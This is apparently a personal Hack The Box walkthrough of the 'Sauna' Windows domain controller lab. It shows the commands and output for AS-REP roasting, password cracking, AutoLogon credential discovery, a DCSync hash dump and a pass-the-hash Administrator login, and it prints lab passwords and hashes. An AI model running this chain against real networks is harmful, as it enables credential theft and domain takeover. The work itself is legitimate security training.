Sauna IP:10.10.10.175


rustscan:
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
80/tcp    open  http           syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
49667/tcp open  unknown        syn-ack
49673/tcp open  unknown        syn-ack
49674/tcp open  unknown        syn-ack
49677/tcp open  unknown        syn-ack
49689/tcp open  unknown        syn-ack
49696/tcp open  unknown        syn-ack


nmap:


PORT      STATE    SERVICE       REASON      VERSION
53/tcp    open     domain        syn-ack     Simple DNS Plus
80/tcp    open     http          syn-ack     Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open     kerberos-sec  syn-ack     Microsoft Windows Kerberos (server time: 2023-02-10 20:07:00Z)
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack     Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack
464/tcp   open     kpasswd5?     syn-ack
5985/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        syn-ack     .NET Message Framing
49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49669/tcp filtered unknown       no-response
49673/tcp open     ncacn_http    syn-ack     Microsoft Windows RPC over HTTP 1.0
49674/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49677/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49689/tcp open     msrpc         syn-ack     Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h18m01s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35558/tcp): CLEAN (Timeout)
|   Check 2 (port 25481/tcp): CLEAN (Timeout)
|   Check 3 (port 64189/udp): CLEAN (Timeout)
|   Check 4 (port 57297/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-10T20:07:53
|_  start_date: N/A



visiting the site on port 80,we are presented with a banking site

Enumerating the site for directory's doesn't give much information. A scan for virtual host brings no information

                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Practice/HackTheBox/Sauna]
└─$ gobuster dir  -u http://sauna.htb  -w /usr/share/wordlists/dirb/common.txt -t 64   
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://sauna.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/02/10 08:01:42 Starting gobuster
===============================================================
/css (Status: 301)
/fonts (Status: 301)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
===============================================================
2023/02/10 08:01:47 Finished
===============================================================
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Sauna]
└─$ gobuster vhost  -u http://sauna.htb  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 64  
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://sauna.htb
[+] Threads:      64
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2023/02/10 08:02:15 Starting gobuster
===============================================================
===============================================================
2023/02/10 08:02:58 Finished
===============================================================


Browsing the site, we reach a page were we find some names. We could probaly use them to search for usernames on the machine

Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb 


Using Impacket’s GetNPUsers.py, we are able to guess the username schema to find users without Kerberos Pre-Authentication enabled, and get a Ticket Granting Ticket (TGT) for fsmith.

─(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetNPUsers.py egotistical-bank.local/fsmith -no-pass                                                                                                                                       1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:39ea4400bec5ff3a74e4ea56fe648062$83cb8eac8902ce44a0e9a2c3d2d3709c999420cf173612ca722e6d2e45777dd3ad2466907d665e76b6ef780b6759b9d021cc042ef241f8096781ce83b7ed87448c23e03199cce5cb6214a41ef3a8738758ef65eadbe6b5187fe59042c492cee2616912646c8451d81bf10a7ac2afbce82b76330b9df09e9431c06868d5b19717122df51024b23b59a6704a394ef201c25b3f991d8137d13aa86cdda25006f2b93adafafa62e41f5e16dff1ccfc78d3f5b0530b421d4eca7f7d05ec764a7eb7d5c9cc9e52930486e588693085feb558da222c2aa0c6ce73a732dbec77e68eeaa0cac0132657c3833089b887372cae68028c7c62bcb8893de1ef2172e95dbac745
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetNPUsers.py egotistical-bank.local/skerb -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for skerb
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetNPUsers.py egotistical-bank.local/scoins -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for scoins
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetNPUsers.py egotistical-bank.local/hbear -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for hbear
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetNPUsers.py egotistical-bank.local/btaylor -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for btaylor
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./GetNPUsers.py egotistical-bank.local/sdriver -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for sdriver
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)


Now that we have the hash, we use john to crack it:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Sauna]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:06 DONE (2023-02-10 08:09) 0.1490g/s 1570Kp/s 1570Kc/s 1570KC/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


We have username fsmith and pass Thestrokes23 and we can log on using evil-winrm:

evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> ls


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/10/2023  11:37 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
ccdee54c494473d896e5e63797e30e56
*Evil-WinRM* PS C:\Users\FSmith\Desktop> 


PRIVESC:
*Evil-WinRM* PS C:\Users\FSmith\Desktop> net user fsmith
User name                    FSmith
Full Name                    Fergus Smith
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/23/2020 8:45:19 AM
Password expires             Never
Password changeable          1/24/2020 8:45:19 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/10/2023 12:25:27 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.



*Evil-WinRM* PS C:\Users\FSmith\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.


when uploading and running winpeasx64.exe on the target machine, there is some interesting informations that stands out:

╔══════════╣ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!





with these credentials we could use secretsdump.py in order to obtain other passwords, may for admin also




*Evil-WinRM* PS C:\Users\FSmith> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.




┌──(kali㉿kali)-[~/…/Lab1/MS17-010_CVE-2017-0143/venv/bin]
└─$ ./secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@sauna.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:cfb531f340f731381d3718d29a68efaa:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:2cf708fe65a674e346c7dd7c1614c5e5d19eca9a6991fa9b876164add4bf93c7
SAUNA$:aes128-cts-hmac-sha1-96:cd4629d53c9af0dd217a5ad45d4216e4
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up... 
                                                                                     

with administrator hash, we can log in using evil-winrm

┌──(kali㉿kali)-[~/Practice/HackTheBox/Sauna]
└─$ evil-winrm -i 10.10.10.175 -u administrator -p aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/10/2023  11:37 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
261b37e67d4bcb7c71fd23a9a30c5212

